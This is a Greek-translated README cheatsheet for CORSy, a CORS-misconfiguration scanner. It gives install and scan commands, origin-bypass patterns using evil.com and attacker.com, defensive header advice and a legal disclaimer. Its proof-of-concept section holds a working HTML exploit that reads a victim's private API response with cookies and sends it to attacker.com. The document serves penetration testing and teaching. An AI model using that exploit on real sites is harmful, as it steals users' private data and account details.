<!-- language-home-navigation -->
[🏠 Ελληνική Αρχική Σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🌐 CORSy - Ολοκληρωμένο Cheatsheet

[🇹🇷 Türkçe Sürüm](μεταφράσεις/README.tr.md)
```
   ██████╗ ██████╗ ██████╗ ███████╗██╗   ██╗
  ██╔════╝██╔═══██╗██╔══██╗██╔════╝╚██╗ ██╔╝
  ██║     ██║   ██║██████╔╝███████╗ ╚████╔╝ 
  ██║     ██║   ██║██╔══██╗╚════██║  ╚██╔╝  
  ╚██████╗╚██████╔╝██║  ██║███████║   ██║   
   ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝   ╚═╝   
      Cross-Origin Resource Sharing (CORS) Misconfiguration Scanner
```
<p align="center">
  <img src="https://img.shields.io/badge/CORSy-CORS_Scanner-blue?style=for-the-badge" alt="CORSy">
  <img src="https://img.shields.io/badge/Author-Somdev_Sangwan-orange?style=for-the-badge" alt="s0md3v">
  <img src="https://img.shields.io/badge/Category-Web_Security_&_API-green?style=for-the-badge" alt="Ασφάλεια Ιστού">
  <img src="https://img.shields.io/badge/License-GPLv3-purple?style=for-the-badge" alt="GPLv3">
</p>

<p align="center">
  <b>🌐 Γρήγορο και ολοκληρωμένο εργαλείο CLI που έχει σχεδιαστεί για να εντοπίζει εσφαλμένες διαμορφώσεις κοινής χρήσης πόρων (CORS) και να δοκιμάζει κινδύνους κλοπής δεδομένων μεταξύ προέλευσης</b>
</p>

---

## 📋 Πίνακας περιεχομένων

- [Overview & CORS Vulnerability Basics](#-overview--cors-vulnerability-basics)
  - [The Fatal Trio: Origin Reflection + Credentials True](#the-fatal-trio-origin-reflection--credentials-true)
- [Εγκατάσταση] (#-εγκατάσταση)
- [Βασική σάρωση στόχου] (#-basic-target-scanning)
- [CORS Attack Vectors Tested](#-cors-attack-vectors-tested)
  - [Αυθαίρετη προέλευση Reflection](#arbitrary-origin-reflection)
  - [Trusting Null Origin (`Origin: null`)](#trusting-null-origin-origin-null)
  - [Πρόθεμα και επίθημα Regex Bypass](#prefix--suffix-regex-bypass)
  - [Εμπιστοσύνη υποτομέα μπαλαντέρ](#wildcard-subdomain-trust)
  - [Special Character Bypass (`_`, `;`, `!`)](#special-character-bypass----)
- [Σάρωση πολλαπλών στόχων & εξαγωγή εξόδου](#-σάρωση πολλαπλών στόχων--εξαγωγή εξόδου)
- [Crafting Proof-of-Concept (PoC) Exploits](#-crafting-proof-of-concept-poc-exploits)
- [Πίνακας γρήγορης αναφοράς] (#-ταχεία αναφορά-πίνακας)
- [Defensive Considerations & Secure Headers](#-defensive-considerations--secure-headers)
- [Νομική αποποίηση ευθυνών](#-νομική αποποίηση ευθυνών)

---

## 🎯 Επισκόπηση & Βασικά στοιχεία ευπάθειας CORS

Το **Cross-Origin Resource Sharing (CORS)** είναι ένας μηχανισμός ασφαλείας του προγράμματος περιήγησης που επιτρέπει στους διακομιστές web να χαλαρώσουν την **Πολιτική ίδιας προέλευσης (SOP)**. Επιστρέφοντας κεφαλίδες όπως:
- `Access-Control-Allow-Origin: <origin>`
- `Access-Control-Allow-Credentials: true`

Μια εφαρμογή Ιστού εκχωρεί σε άλλους ιστότοπους την άδεια να διαβάζουν τις απαντήσεις HTTP για λογαριασμό του χρήστη-θύματος.

### The Fatal Trio: Origin Reflection + Credentials True
Όταν μια εφαρμογή αντικατοπτρίζει τυφλά την εισερχόμενη κεφαλίδα `Origin` στο `Access-Control-Allow-Origin` και ενεργοποιεί το `Access-Control-Allow-Credentials: true`, οποιοσδήποτε κακόβουλος ιστότοπος μπορεί να αναγκάσει το πρόγραμμα περιήγησης ενός πιστοποιημένου επισκέπτη να διαβάσει προσωπικά μηνύματα, κλειδιά API και λεπτομέρειες λογαριασμού.

Δημιουργήθηκε από τον **Somdev Sangwan (s0md3v)**, ο **CORSy** ανιχνεύει συστηματικά τελικά σημεία με 16+ γνωστές μεταθέσεις προέλευσης για να εντοπίσει αυτές τις εσφαλμένες διαμορφώσεις.

---

## 📥 Εγκατάσταση
```bash
# Clone the repository
git clone https://github.com/s0md3v/Corsy.git
cd Corsy

# Install dependencies
pip install -r requirements.txt

# Run Corsy
python3 corsy.py -h
```
---

## 🚀 Βασική σάρωση στόχου

Σάρωση μιας μεμονωμένης εφαρμογής web:
```bash
python3 corsy.py -u https://target.com/api/user/details
```
Προσθήκη προσαρμοσμένων κεφαλίδων ή cookie περιόδου λειτουργίας:
```bash
python3 corsy.py -u https://target.com/api/user/details \
  --headers "Cookie: session=abc123xyz"
```
---

## ⚡ Δοκιμασμένα διανύσματα επίθεσης CORS

Το CORSy ελέγχει αυτόματα διάφορα μοτίβα μετάθεσης προέλευσης:

### Αντανάκλαση αυθαίρετης προέλευσης
Ο διακομιστής αντικατοπτρίζει τυφλά οποιονδήποτε τομέα:
```http
Request:
Origin: https://evil.com

Response:
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```
### Trusting Null Origin (`Origin: null`)
Οι εφαρμογές ενδέχεται να εμπιστεύονται τις προελεύσεις `null` (κοινές με τοπικά iframe με περιβάλλον δοκιμών ή διευθύνσεις URL `data:`):
```http
Request:
Origin: null

Response:
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```
*Μπορεί να ενεργοποιηθεί με τη φόρτωση του API του θύματος από ένα iframe με `sandbox="allow-scripts allow-top-navigation"`.*

### Πρόθεμα & Επίθημα Regex Bypass
Κακή επικύρωση regex (π.χ. `.*target.com` ή `target.com.*`):
- `https://target.com.attacker.com`
- `https://not-target.com`

### Παράκαμψη ειδικών χαρακτήρων (`_`, `;`, `!`)
Τα προγράμματα περιήγησης και οι διακομιστές χειρίζονται διαφορετικά τους οριοθέτες URI:
- `https://target.com_.attacker.com`
- `https://target.com%60.attacker.com`

---

## 🌐 Σάρωση πολλαπλών στόχων & εξαγωγή εξόδου

Σαρώστε μεγάλες λίστες τερματικών σημείων API που ανακαλύφθηκαν από αναγνώριση:
```bash
# Scan a list of URLs with 10 concurrent threads
python3 corsy.py -i endpoints.txt -t 10

# Export results to clean JSON format
python3 corsy.py -i endpoints.txt -o cors_results.json
```
---

## 💻 Κατασκευή απόδειξης ιδέας (PoC) Exploits

Όταν το CORSy επιβεβαιώσει μια εσφαλμένη διαμόρφωση με επιτρεπόμενα διαπιστευτήρια, δημιουργήστε μια εκμετάλλευση HTML για την κλοπή ευαίσθητων δεδομένων:
```html
<!DOCTYPE html>
<html>
<body>
<h1>CORS Exploit Demo</h1>
<script>
    var req = new XMLHttpRequest();
    req.onload = function() {
        // Exfiltrate stolen private response to attacker server
        fetch("https://attacker.com/log?data=" + encodeURIComponent(this.responseText));
    };
    req.open("GET", "https://target.com/api/user/private_data", true);
    req.withCredentials = true; // Crucial for sending session cookies
    req.send();
</script>
</body>
</html>
```
---

## ⚡ Γρήγορος Πίνακας Αναφοράς

| Στόχος | Εντολή |
|-----------|---------|
| **Σάρωση μεμονωμένης διεύθυνσης URL** | `python3 corsy.py -u <URL>` |
| **Σάρωση με Cookie περιόδου λειτουργίας** | `python3 corsy.py -u <URL> --headers "Cookie: sess=123"` |
| **Σάρωση λίστας διευθύνσεων URL** | `python3 corsy.py -i targets.txt` |
| **Σάρωση πολλαπλών νημάτων** | `python3 corsy.py -i targets.txt -t 20` |
| **Εξαγωγή σε JSON** | `python3 corsy.py -i targets.txt -o results.json` |

---

## 🛡️ Αμυντικές εκτιμήσεις και ασφαλείς κεφαλίδες

1. **Να μην αντικατοπτρίζει ποτέ την προέλευση αυθαίρετα:** Συγκρίνετε την κεφαλίδα `Origin` με μια ρητή, αυστηρή λίστα επιτρεπόμενων από την πλευρά του διακομιστή.
2. **Να μην γίνεται ποτέ σύζευξη μπαλαντέρ με διαπιστευτήρια:** Το πρόγραμμα περιήγησης αποκλείει το `Access-Control-Allow-Origin: *` με το `Credentials: true`, αλλά ποτέ μην το μιμείται δυναμικά.
3. **Αποφύγετε να εμπιστεύεστε το `null`:** Μην προσθέτετε το `null` στις πολιτικές αξιόπιστης προέλευσης.

---

## ⚠️ Νομική αποποίηση ευθύνης

> [!ΠΡΟΣΟΧΗ]
> Το CORSy προορίζεται αυστηρά για εξουσιοδοτημένες αξιολογήσεις ασφάλειας, δοκιμές διείσδυσης και αμυντικό έλεγχο. Η δοκιμή ιστοτόπων χωρίς εξουσιοδότηση είναι παράνομη.